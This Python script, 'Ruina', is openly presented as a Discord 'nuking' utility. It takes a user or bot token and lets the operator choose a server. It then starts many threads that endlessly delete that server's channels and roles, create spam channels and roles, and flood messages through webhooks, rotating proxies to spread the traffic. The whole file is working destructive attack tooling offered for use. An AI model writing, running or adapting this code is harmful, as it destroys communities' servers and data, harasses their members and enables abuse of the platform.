"""
Ruina
~ A discord nuking utility
https://github.com/Brew-Softworks
"""
import os, requests, threading, toml, random, datetime, time

' Init Ruina '
os.system('cls' if os.name == 'nt' else 'clear')
class Ruina:
    def __init__(self):
        print("""\033[38;2;204;153;102m
█▀█ █░█ █ █▄░█ ▄▀█
█▀▄ █▄█ █ █░▀█ █▀█
\033[0m""")
        if not os.path.exists("config.toml"):
            config = open("config.toml", "w")
            config.write("""[ Ruina_Settings ]
Token = ""
Proxies = []""")
            config.close()
            raise Exception("Please fill in your config.toml file.")
            
        self.Configuration = toml.load("config.toml")["Ruina_Settings"]
        self.Token = self.Configuration["Token"]
        self.Client = "User"
        try:
            meRes = requests.get("https://discord.com/api/v10/users/@me", headers={"Authorization": self.Token})
            if meRes.status_code == 200:
                pass
            elif meRes.status_code == 401:
                meRes = requests.get("https://discord.com/api/v10/users/@me", headers={"Authorization": "Bot "+self.Token})
                if meRes.status_code == 200:
                    self.Client = "Bot"
                    self.Token = "Bot "+self.Token
                else:
                    raise Exception("Invalid token in configuration (config.toml)")
        except:
            self.Notify("Invalid token in configuration")
            raise Exception("Invalid token in configuration (config.toml)")
        self.Notify("Loaded Ruina configuration")

    def getProxy(self):
        proxy_url = "http://" + random.choice(self.Configuration["Proxies"])
        return {"http": proxy_url}
    
    def Notify(self, *msg: str):
        newmsg = ""
        for string in msg:
            newmsg = newmsg + " " + str(string)

        print(f"\033[38;2;204;153;102mRuina {str(datetime.datetime.now())[:-7]}\033[0m: {newmsg}")

    def initRuina(self):
        ' Fetch Information '
        meRes = requests.get("https://discord.com/api/v10/users/@me", headers={"Authorization": self.Token})
        self.Notify("Client:", self.Client)
        self.Notify("Ruina is ready as", meRes.json()["username"])
        Guilds = requests.get("https://discord.com/api/v10/users/@me/guilds", headers={"Authorization": self.Token})
        self.Notify("Available guilds:")
        maxInt = None
        for i, Guild in enumerate(Guilds.json()):
            print(i, Guild['name'])
            maxInt = i
        print('')
        
        ' Start Nuking '
        Select = int(input(f"\033[38;2;204;153;102mNuke Guild\033[0m (0-{str(maxInt)}): "))
        Guild = Guilds.json()[Select]
        
        Ignore = set()
        Webhooks = []
        Channels = requests.get(f"https://discord.com/api/v10/guilds/{Guild['id']}/channels", headers={"Authorization": self.Token}, proxies=self.getProxy())
        Roles = requests.get(f"https://discord.com/api/v10/guilds/{Guild['id']}/roles", headers={"Authorization": self.Token}, proxies=self.getProxy())
        def createChannels():
            while True:
                channelName = random.choice(self.Configuration["channelNames"])
                try:
                    Response = requests.post(f"https://discord.com/api/v9/guilds/{Guild['id']}/channels", json={"name": random.choice(self.Configuration["channelNames"])}, headers={"Authorization": self.Token}, proxies=self.getProxy())
                    if Response.status_code != 201:
                        self.Notify(f"[{Response.status_code}] Failed to create #{channelName}")
                except:
                    self.Notify(f"[Exception] Failed to create #{channelName}")
        def deleteChannels():
            while True:
                for Channel in Channels.json():
                    if not Channel["name"] in self.Configuration["channelNames"]:
                        try:
                            if Channel['id'] not in Ignore:
                                Ignore.add(Channel['id'])
                                Response = requests.delete(f"https://discord.com/api/v9/channels/{Channel['id']}", headers={"Authorization": self.Token}, proxies=self.getProxy())
                                if Response.status_code != 200:
                                    self.Notify(f"[{Response.status_code}] Failed to remove #{Channel['name']}")
                        except:
                            self.Notify(f"[Exception] Failed to remove #{Channel['name']}")
        def createRoles():
            while True:
                roleName = random.choice(self.Configuration["roleNames"])
                try:
                    Response = requests.post(f"https://discord.com/api/v9/guilds/{Guild['id']}/roles", json={"name": random.choice(self.Configuration["roleNames"]), "color": 0, "permissions": "0"}, headers={"Authorization": self.Token}, proxies=self.getProxy())
                    if Response.status_code != 200:
                        self.Notify(f"[{Response.status_code}] Failed to create @&{roleName}")
                except:
                    self.Notify(f"[Exception] Failed to create @&{roleName}")
        def deleteRoles():
            while True:
                for Role in Roles.json():
                    if not Role["name"] in self.Configuration["roleNames"]:
                        try:
                            if Role['id'] not in Ignore:
                                Ignore.add(Role['id'])
                                Response = requests.delete(f"https://discord.com/api/v9/roles/{Role['id']}", headers={"Authorization": self.Token}, proxies=self.getProxy())
                                if Response.status_code != 204:
                                    self.Notify(f"[{Response.status_code}] Failed to remove @&{Role['name']}") 
                        except:
                            self.Notify(f"[Exception] Failed to remove @&{Role['name']}")
        def webhookSpam():
            while True:
                try:
                    Channels = requests.get(f"https://discord.com/api/v10/guilds/{Guild['id']}/channels", headers={"Authorization": self.Token}, proxies=self.getProxy())
                    for Channel in Channels.json():
                        Response = requests.get(f"https://discord.com/api/v9/channels/{Channel['id']}/webhooks", json={"name": random.choice(self.Configuration["webhookNames"])}, headers={"Authorization": self.Configuration["Token"]}, proxies=self.getProxy())
                        if Response.status_code == 200:
                            Message = requests.post(Response.json()["url"], json={"content": self.Configuration["Messages"]}, proxies=self.getProxy())
                            Webhooks.append(Response.json()["url"])
                    for Webhook in Webhooks[:]:
                        Message = requests.post(Webhook, json={"content": self.Configuration["Messages"]}, proxies=self.getProxy())
                        if not Message.status_code == 204:
                            self.Notify(f"[{Message.status_code}]Failed to send webhook message", Webhook)
                            Webhooks.remove(Webhook)
                except:
                    self.Notify("[Exception] Failed to create or use webhook")
                time.sleep(1)
        
        for x in range(self.Configuration["Threads"] + 1):
            threading.Thread(target=createChannels).start()
            threading.Thread(target=deleteChannels).start()
            threading.Thread(target=createRoles).start()
            threading.Thread(target=deleteRoles).start()
            threading.Thread(target=webhookSpam).start()
        self.Notify("Started", self.Configuration["Threads"], "threads")
        
        input("")
        
try:
    Ruina().initRuina()
except Exception as e:
    print(f"\033[38;2;204;153;102mRuina {str(datetime.datetime.now())[:-7]}\033[0m: Issue in Ruina\n",e)
    input("")